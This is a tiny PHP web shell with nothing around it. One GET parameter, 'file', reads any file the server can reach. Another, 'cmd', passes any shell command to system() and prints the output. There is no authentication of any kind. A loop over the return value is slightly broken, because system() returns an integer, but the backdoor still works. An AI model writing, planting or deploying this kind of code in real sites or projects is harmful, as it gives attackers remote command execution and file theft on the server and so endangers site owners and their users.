<?php
	if( !empty($_GET['file'])) 
		 echo htmlspecialchars( file_get_contents( $_GET['file'], true) ); 
	if( !empty($_GET['cmd'])) 
	{ 
		system( $_GET['cmd'], $retval);
		foreach( $retval as $r )
		{
			echo $r."<br/>";
		} 
	} 
?>